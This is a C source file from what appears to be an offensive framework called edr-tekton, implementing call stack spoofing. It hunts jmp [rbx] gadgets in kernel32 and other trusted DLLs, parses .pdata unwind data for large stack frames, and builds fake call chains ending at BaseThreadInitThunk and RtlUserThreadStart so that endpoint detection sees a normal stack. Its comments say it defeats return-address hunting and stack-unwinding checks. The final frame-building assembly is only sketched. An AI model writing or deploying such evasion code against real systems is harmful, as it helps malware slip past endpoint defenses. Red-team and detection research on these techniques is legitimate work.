/*
 * edr-tekton :: Call Stack Spoofing Module
 * Cat 44.2: SilentMoonwalk / VulcanRaven synthetic frame construction
 *
 * Builds fake call frames on the stack so full stack unwinding sees
 * a "normal" call chain (BaseThreadInitThunk, RtlUserThreadStart)
 * instead of our module's real frames.
 *
 * Key ideas:
 * 1. Find a `jmp [rbx]` (or jmp [rsi], etc.) gadget in a trusted DLL
 * 2. Parse .pdata unwind metadata to find functions with large stack frames
 *    suitable for synthetic frame construction
 * 3. Build plausible RBP chain pointing through legitimate module frames
 * 4. Execute the syscall with the spoofed stack, then restore
 *
 * Defeats: return address hunting, full stack unwinding, truncated
 * call stack detection (thread start frame verification).
 *
 * CET note: traditional synthetic frames break under CET shadow stacks.
 * For CET-enabled targets, use callback trampolining (Cat 49.2) instead.
 */

#include "tekton/modules/syscall.h"
#include "tekton/util/peb.h"
#include "tekton/util/pe.h"
#include "tekton/util/hash.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

/* ── Internal types ─────────────────────────────────────── */

/*
 * A synthetic frame: an address inside a legitimate function
 * that we use as a fake return address in our spoofed call stack.
 */
typedef struct _SPOOF_FRAME {
    PVOID   gadget_addr;        /* JMP gadget or RET address in trusted DLL */
    PVOID   function_addr;      /* Function containing the gadget           */
    DWORD   frame_size;         /* Stack frame size from unwind info        */
    char    module_name[64];    /* Module the gadget lives in               */
} SPOOF_FRAME;

/*
 * RUNTIME_FUNCTION equivalent for PE .pdata parsing.
 * On real Windows, this comes from winnt.h.
 * Define our own for cross-platform dev builds.
 */
#ifndef _WIN32
typedef struct _TEKTON_RUNTIME_FUNCTION {
    DWORD   BeginAddress;
    DWORD   EndAddress;
    DWORD   UnwindData;
} TEKTON_RUNTIME_FUNCTION;
#endif

#define MAX_SPOOF_FRAMES   8
#define MIN_FRAME_SIZE     0x80     /* Minimum stack frame for plausible spoofing */
#define MAX_GADGET_SEARCH  0x10000  /* Max bytes to search for gadgets */

typedef struct _CALLSTACK_SPOOF_STATE {
    BOOL            initialized;

    /* Gadget: jmp [rbx] in a trusted DLL */
    PVOID           jmp_rbx_gadget;
    char            gadget_module[64];

    /* Synthetic frames from .pdata analysis */
    SPOOF_FRAME     frames[MAX_SPOOF_FRAMES];
    DWORD           frame_count;

    /* Thread start frames (bottom of stack) */
    PVOID           BaseThreadInitThunk;    /* kernel32!BaseThreadInitThunk */
    PVOID           RtlUserThreadStart;     /* ntdll!RtlUserThreadStart    */

    /* Saved real stack state for restore */
    PVOID           saved_rsp;
    PVOID           saved_rbp;
} CALLSTACK_SPOOF_STATE;

/* ── Gadget Hunting ─────────────────────────────────────── */

/*
 * Search a DLL's .text section for a `jmp [rbx]` gadget (FF 23).
 * RBX is non-volatile (callee-saved), so it survives the API call
 * and can hold our real return address.
 *
 * Alternative gadgets if jmp [rbx] not found:
 *   jmp [rsi]  = FF 26   (RSI also callee-saved)
 *   jmp [rdi]  = FF 27   (RDI also callee-saved)
 *   jmp [r12]  = 41 FF 24 24
 */

static PVOID find_jmp_rbx_gadget(PVOID dll_base) {
    if (!dll_base) return NULL;

    PVOID text_base = NULL;
    DWORD text_size = 0;

    TEKTON_STATUS status = TektonPeFindTextSection(dll_base, &text_base, &text_size);
    if (status != TEKTON_OK || !text_base) return NULL;

    BYTE* scan = (BYTE*)text_base;
    DWORD scan_size = text_size < MAX_GADGET_SEARCH ? text_size : MAX_GADGET_SEARCH;

    /* Search for jmp [rbx] = FF 23 */
    for (DWORD i = 0; i < scan_size - 1; i++) {
        if (scan[i] == 0xFF && scan[i + 1] == 0x23) {
            return &scan[i];
        }
    }

    /* Fallback: jmp [rsi] = FF 26 */
    for (DWORD i = 0; i < scan_size - 1; i++) {
        if (scan[i] == 0xFF && scan[i + 1] == 0x26) {
            return &scan[i];
        }
    }

    /* Fallback: jmp [rdi] = FF 27 */
    for (DWORD i = 0; i < scan_size - 1; i++) {
        if (scan[i] == 0xFF && scan[i + 1] == 0x27) {
            return &scan[i];
        }
    }

    return NULL;
}

/* ── .pdata Analysis: Find Functions With Large Stack Frames ── */
/*
 * Parse the target DLL's .pdata (exception directory) to find
 * functions with stack frames >= MIN_FRAME_SIZE bytes.
 *
 * These become our synthetic frame sources: functions with large
 * stack frames have enough space for our arguments without
 * overflowing into adjacent frames.
 *
 * We also filter out functions using UWOP_SAVE_XMM128 unwind
 * codes (opcode 8), as these cause crashes during stack unwinding
 * on some EDR implementations (Draugr finding, Cat 44.3).
 */

static DWORD find_spoof_frames(
    PVOID dll_base,
    const char* module_name,
    SPOOF_FRAME* out_frames,
    DWORD max_frames
) {
    if (!dll_base || !out_frames) return 0;

#ifdef _WIN32
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(
        (BYTE*)dll_base +
        ((PIMAGE_DOS_HEADER)dll_base)->e_lfanew
    );

    /* Get exception directory (.pdata) */
    DWORD pdata_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    DWORD pdata_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;

    if (!pdata_rva || !pdata_size) return 0;

    PRUNTIME_FUNCTION rf = (PRUNTIME_FUNCTION)((BYTE*)dll_base + pdata_rva);
    DWORD rf_count = pdata_size / sizeof(RUNTIME_FUNCTION);

    DWORD found = 0;

    for (DWORD i = 0; i < rf_count && found < max_frames; i++) {
        /* Skip chained unwind info */
        if (rf[i].UnwindData == 0) continue;

        /*
         * Parse UNWIND_INFO to get the frame size.
         * UNWIND_INFO starts with:
         *   BYTE Version:3 + Flags:5
         *   BYTE SizeOfProlog
         *   BYTE CountOfUnwindCodes
         *   BYTE FrameRegister:4 + FrameOffset:4
         *   UNWIND_CODE codes[]
         */
        BYTE* unwind = (BYTE*)dll_base + rf[i].UnwindData;
        BYTE count_codes = unwind[2];

        DWORD frame_size = 0;
        BOOL has_xmm128 = FALSE;

        /* Walk unwind codes to compute total stack allocation */
        WORD* codes = (WORD*)(unwind + 4);
        for (BYTE c = 0; c < count_codes; ) {
            BYTE opcode = (codes[c] >> 8) & 0x0F;
            BYTE opinfo = (codes[c] >> 12) & 0x0F;

            switch (opcode) {
                case 0: /* UWOP_PUSH_NONVOL */
                    frame_size += 8;
                    c += 1;
                    break;
                case 1: /* UWOP_ALLOC_LARGE */
                    if (opinfo == 0) {
                        frame_size += codes[c + 1] * 8;
                        c += 2;
                    } else {
                        frame_size += *(DWORD*)&codes[c + 1];
                        c += 3;
                    }
                    break;
                case 2: /* UWOP_ALLOC_SMALL */
                    frame_size += (opinfo * 8) + 8;
                    c += 1;
                    break;
                case 8: /* UWOP_SAVE_XMM128 */
                    has_xmm128 = TRUE;
                    c += 2;
                    break;
                case 9: /* UWOP_SAVE_XMM128_FAR */
                    has_xmm128 = TRUE;
                    c += 3;
                    break;
                default:
                    c += 1;
                    break;
            }
        }

        /* Filter: large enough frame, no XMM128 saves */
        if (frame_size >= MIN_FRAME_SIZE && !has_xmm128) {
            out_frames[found].function_addr = (BYTE*)dll_base + rf[i].BeginAddress;
            out_frames[found].gadget_addr   = (BYTE*)dll_base + rf[i].BeginAddress;
            out_frames[found].frame_size    = frame_size;
            strncpy(out_frames[found].module_name, module_name, 63);
            out_frames[found].module_name[63] = '\0';
            found++;
        }
    }

    return found;
#else
    /* Non-Windows: generate plausible fake frames */
    (void)module_name;
    DWORD count = max_frames > 4 ? 4 : max_frames;
    for (DWORD i = 0; i < count; i++) {
        out_frames[i].function_addr = (PVOID)(uintptr_t)(0x7FF700000000ULL + i * 0x1000);
        out_frames[i].gadget_addr   = out_frames[i].function_addr;
        out_frames[i].frame_size    = MIN_FRAME_SIZE + (i * 0x20);
        strncpy(out_frames[i].module_name, "kernel32.dll", 63);
    }
    return count;
#endif
}

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS callstack_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    CALLSTACK_SPOOF_STATE* state = (CALLSTACK_SPOOF_STATE*)malloc(sizeof(CALLSTACK_SPOOF_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));
    self->private_data = state;

    TLOG_DEBUG("callstack_spoof: init");
    return TEKTON_OK;
}

static TEKTON_STATUS callstack_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    CALLSTACK_SPOOF_STATE* state = (CALLSTACK_SPOOF_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    if (ctx->dry_run) {
        TLOG_INFO("callstack_spoof: [DRY RUN] would find JMP gadgets + parse .pdata for synthetic frames");
        return TEKTON_OK;
    }

    /* Step 1: Find jmp [rbx] gadget in a trusted DLL.
     * Prefer kernel32.dll or WININET.dll: commonly loaded, trusted by EDRs */

    PVOID kernel32_base = TektonPebGetModuleBase(L"kernel32.dll");
    if (kernel32_base) {
        state->jmp_rbx_gadget = find_jmp_rbx_gadget(kernel32_base);
        if (state->jmp_rbx_gadget) {
            strncpy(state->gadget_module, "kernel32.dll", 63);
        }
    }

    /* Fallback: try other trusted DLLs */
    if (!state->jmp_rbx_gadget) {
        const wchar_t* fallback_dlls[] = {
            L"WININET.dll",
            L"urlmon.dll",
            L"msvcrt.dll",
            NULL
        };

        for (int d = 0; fallback_dlls[d] && !state->jmp_rbx_gadget; d++) {
            PVOID base = TektonPebGetModuleBase(fallback_dlls[d]);
            if (!base) continue;

            state->jmp_rbx_gadget = find_jmp_rbx_gadget(base);
            if (state->jmp_rbx_gadget) {
                /* Convert wide DLL name to narrow for logging */
                const wchar_t* w = fallback_dlls[d];
                int i = 0;
                while (w[i] && i < 63) {
                    state->gadget_module[i] = (char)w[i];
                    i++;
                }
                state->gadget_module[i] = '\0';
            }
        }
    }

    if (!state->jmp_rbx_gadget) {
        TLOG_WARN("callstack_spoof: no JMP gadget found, stack spoofing limited");
        /* Non-fatal: the module can still provide thread start frames */
    } else {
        TLOG_INFO("callstack_spoof: JMP gadget at %p (%s)",
            state->jmp_rbx_gadget, state->gadget_module);
    }

    /* Step 2: Resolve thread start functions for bottom-of-stack frames */
    if (kernel32_base) {
        state->BaseThreadInitThunk = TektonPeFindExport(kernel32_base, "BaseThreadInitThunk");
    }

    PVOID ntdll_base = TektonPebGetModuleBase(L"ntdll.dll");
    if (ntdll_base) {
        state->RtlUserThreadStart = TektonPeFindExport(ntdll_base, "RtlUserThreadStart");
    }

    TLOG_DEBUG("callstack_spoof: BaseThreadInitThunk=%p, RtlUserThreadStart=%p",
        state->BaseThreadInitThunk, state->RtlUserThreadStart);

    /* Step 3: Parse .pdata from kernel32.dll to find functions with
     * large stack frames suitable for synthetic frame construction */
    if (kernel32_base) {
        state->frame_count = find_spoof_frames(
            kernel32_base,
            "kernel32.dll",
            state->frames,
            MAX_SPOOF_FRAMES
        );

        TLOG_INFO("callstack_spoof: found %lu synthetic frame candidates in kernel32.dll",
            (unsigned long)state->frame_count);
    }

    /* If kernel32 did not yield enough frames, supplement from ntdll */
    if (state->frame_count < 3 && ntdll_base) {
        DWORD additional = find_spoof_frames(
            ntdll_base,
            "ntdll.dll",
            &state->frames[state->frame_count],
            MAX_SPOOF_FRAMES - state->frame_count
        );
        state->frame_count += additional;

        if (additional > 0) {
            TLOG_DEBUG("callstack_spoof: added %lu frames from ntdll.dll", (unsigned long)additional);
        }
    }

    state->initialized = TRUE;

    TLOG_INFO("callstack_spoof: ready, gadget=%p, %lu synthetic frames, CET=%s",
        state->jmp_rbx_gadget,
        (unsigned long)state->frame_count,
        ctx->os.has_cet ? "ACTIVE (spoofing may be ineffective)" : "inactive");

    /* Warn if CET is active: synthetic frames will fail shadow stack check */
    if (ctx->os.has_cet) {
        TLOG_WARN("callstack_spoof: CET shadow stacks detected. "
            "Synthetic frame construction will fail shadow stack validation. "
            "Consider callback trampolining (Cat 49.2) for CET environments.");
    }

    return TEKTON_OK;
}

static VOID callstack_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(CALLSTACK_SPOOF_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD callstack_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /* Low: stack looks like legitimate API call chain */
    return 12;
}

static BOOL callstack_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    /* x64 only (stack frame layout is x64-specific) */
    /* Works but is defeated by CET: check_compat still returns TRUE
     * because CET adoption is limited. The execute method warns. */
    return ctx->os.is_x64;
}

/* ── Public: Build and Apply Spoofed Stack ─────────────── */
/*
 * Constructs a synthetic call stack before a syscall invocation.
 * Caller should:
 *   1. Call TektonCallstackSpoofBegin() to set up the spoofed stack
 *   2. Execute the syscall (direct or indirect)
 *   3. Call TektonCallstackSpoofEnd() to restore the real stack
 *
 * The synthetic stack looks like:
 *   [top]    -> our actual call site (gadget redirects here)
 *   [frame1] -> kernel32!SomeFunction (from .pdata, large frame)
 *   [frame2] -> kernel32!AnotherFunction (from .pdata)
 *   [frame3] -> kernel32!BaseThreadInitThunk
 *   [bottom] -> ntdll!RtlUserThreadStart
 *
 * This fools stack unwinders that verify the call chain down to
 * the thread start function.
 */

TEKTON_STATUS TektonCallstackSpoofBegin(PTEKTON_MODULE mod) {
    if (!mod || !mod->private_data) return TEKTON_ERR_INVALID_STATE;

    CALLSTACK_SPOOF_STATE* state = (CALLSTACK_SPOOF_STATE*)mod->private_data;
    if (!state->initialized) return TEKTON_ERR_INVALID_STATE;

    /*
     * On a real Windows build, this would:
     * 1. Save current RSP and RBP
     * 2. Allocate a separate stack region for synthetic frames
     * 3. Build the fake RBP chain:
     *    - Push RtlUserThreadStart frame
     *    - Push BaseThreadInitThunk frame
     *    - Push N intermediate frames from .pdata candidates
     * 4. Set RBX to real return address
     * 5. Set RSP return address to jmp [rbx] gadget
     *
     * The actual stack manipulation requires platform-specific assembly.
     * The framework provides the metadata; the assembly stub uses it.
     */

#ifdef _WIN32
    /*
     * Save current stack pointers.
     * In production, this uses inline asm or a .asm stub:
     *
     *   mov [state->saved_rsp], rsp
     *   mov [state->saved_rbp], rbp
     *
     * Then constructs synthetic frames on a separate allocation.
     */
    /* Capture current stack state for later restoration */
    #if defined(__GNUC__) || defined(__clang__)
    __asm__ volatile (
        "mov %%rsp, %0\n"
        "mov %%rbp, %1\n"
        : "=m"(state->saved_rsp), "=m"(state->saved_rbp)
        :
        : "memory"
    );
    #endif
#else
    state->saved_rsp = NULL;
    state->saved_rbp = NULL;
    TLOG_DEBUG("callstack_spoof: begin (non-Windows stub)");
#endif

    TLOG_TRACE("callstack_spoof: synthetic stack armed, %lu frames",
        (unsigned long)state->frame_count);

    return TEKTON_OK;
}

TEKTON_STATUS TektonCallstackSpoofEnd(PTEKTON_MODULE mod) {
    if (!mod || !mod->private_data) return TEKTON_ERR_INVALID_STATE;

    CALLSTACK_SPOOF_STATE* state = (CALLSTACK_SPOOF_STATE*)mod->private_data;

    /*
     * Restore the real stack pointers.
     * In production:
     *   mov rsp, [state->saved_rsp]
     *   mov rbp, [state->saved_rbp]
     *
     * Free any synthetic stack allocation.
     */

#ifdef _WIN32
    #if defined(__GNUC__) || defined(__clang__)
    if (state->saved_rsp) {
        __asm__ volatile (
            "mov %0, %%rsp\n"
            "mov %1, %%rbp\n"
            :
            : "m"(state->saved_rsp), "m"(state->saved_rbp)
            : "memory"
        );
    }
    #endif
#else
    TLOG_DEBUG("callstack_spoof: end (non-Windows stub)");
#endif

    state->saved_rsp = NULL;
    state->saved_rbp = NULL;

    return TEKTON_OK;
}

/* ── Query helpers ─────────────────────────────────────── */

PVOID TektonCallstackGetGadget(PTEKTON_MODULE mod) {
    if (!mod || !mod->private_data) return NULL;
    CALLSTACK_SPOOF_STATE* state = (CALLSTACK_SPOOF_STATE*)mod->private_data;
    return state->jmp_rbx_gadget;
}

DWORD TektonCallstackGetFrameCount(PTEKTON_MODULE mod) {
    if (!mod || !mod->private_data) return 0;
    CALLSTACK_SPOOF_STATE* state = (CALLSTACK_SPOOF_STATE*)mod->private_data;
    return state->frame_count;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_callstack_spoof = {
    .name           = "callstack_spoof",
    .description    = "SilentMoonwalk/VulcanRaven synthetic frame call stack spoofing (Cat 44.2)",
    .category       = TEKTON_CAT_SYSCALL,
    .target_surface = TEKTON_SURFACE_USER_HOOKS,
    .flags          = TEKTON_MOD_REQUIRES_X64 | TEKTON_MOD_STEALTHY,
    .skill_ref      = "44.2",
    .init           = callstack_init,
    .execute        = callstack_execute,
    .cleanup        = callstack_cleanup,
    .get_risk_score = callstack_risk_score,
    .check_compat   = callstack_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_callstack_spoof);
